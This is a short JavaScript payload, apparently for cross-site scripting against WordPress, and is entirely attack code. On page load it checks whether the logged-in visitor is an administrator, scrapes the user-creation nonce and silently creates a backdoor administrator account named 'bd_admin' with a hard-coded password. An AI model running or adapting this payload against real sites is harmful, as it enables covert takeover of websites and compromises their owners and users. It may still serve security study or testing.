var admin_bar = "wpadminbar";  					// check if user is logged in
var ap = "/wp-admin/profile.php";               // path to user profile
var au = "/wp-admin/user-new.php";


var bd_username	=	"bd_admin";
var bd_password =	"bd_password";
var bd_email	=	"bd_admin@lan.lan";

var reg_new_user		=	/_wpnonce_create-user" value="([^]*?)"/;

/*
 * Makes a GET request
 */

function get_request(url,callback)
{
    var xhttp = new XMLHttpRequest();
    // executed every time the status of the XMLHttpRequest object changes
    xhttp.onreadystatechange = function () {
        // readyState 4 == DONE
        // status 200   == successful_request
        if (this.readyState == 4 && this.status == 200){
            if (typeof callback == "function") {
                callback.apply(xhttp);
            }
        }
    }

    xhttp.open("GET",url,false);
    xhttp.send();
}

/*
 * GUESS WHAT!
 */

function post_request(url,data)
{
    var r = new XMLHttpRequest();
    r.open("POST",url,true);
    r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    r.send(data);
}

/*
 * Checks if the user is an administrator
 * by checking the admin panel elements
 * @true    user is admin
 * @false   user is not an admin
 */
function check_user_priv(html)
{
    //create dom element
    var del = document.createElement('html');
    del.innerHTML = html
    var wp_menu_array = del.getElementsByClassName("wp-menu-name");
    for(var i = 0; i < wp_menu_array.length; i++) {
        if(wp_menu_array[i].textContent == "Users")
        {
            // user is an admin :)
            // this method if checking perms
            // could fail if wordpress panel is used in another language
            return true;
		}
    }
    return false;
}

function create_bd_user()
{
	var tmp;
	var unonce;
	get_request(au, function(){tmp = this.responseText});
	unonce = reg_new_user.exec(tmp)[1];
	var post_data = "action=createuser&_wpnonce_create-user=" + unonce + "&user_login=" + bd_username + "&email=" + bd_email + "&pass1=" + bd_password + "&pass2=" + bd_password + "&role=administrator";
	post_request(au,post_data);
}


function main()
{
	var l = document.getElementById(admin_bar);
	if(l){
		// user is logged in
		var tmp;
		var is_adm;
		get_request(ap, function(){tmp = this.responseText})
		if(tmp){
				is_adm = check_user_priv(tmp);
				if(is_adm == true)
				{
					create_bd_user();
				}
			}
		}
}

window.onload = function() { main(); }


